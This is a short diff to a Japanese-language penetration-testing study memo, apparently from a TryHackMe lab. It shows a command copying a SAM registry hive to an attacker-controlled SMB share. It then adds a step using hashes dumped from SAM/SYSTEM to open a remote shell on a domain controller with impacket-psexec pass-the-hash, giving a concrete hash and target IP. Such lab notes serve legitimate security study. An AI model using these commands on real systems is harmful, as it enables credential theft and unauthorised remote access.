@@ -68,3 +68,8 @@ Kali側でサーバとして待ち受けてからWindwos側で以下みたいな
 ```
 copy C:\Users\THMBackup\sam.hive \\10.13.58.5\public\ \\10.13.58.5\public\ 
 ```
+
+10. SAMやSYSTEMからダンプしたハッシュをもとに、kaliからDC等のマシンへpsexecでシェルをとれる。ターゲットがwin-rmを許可していないときとかはこっちで接続。
+```
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.127.140
+```
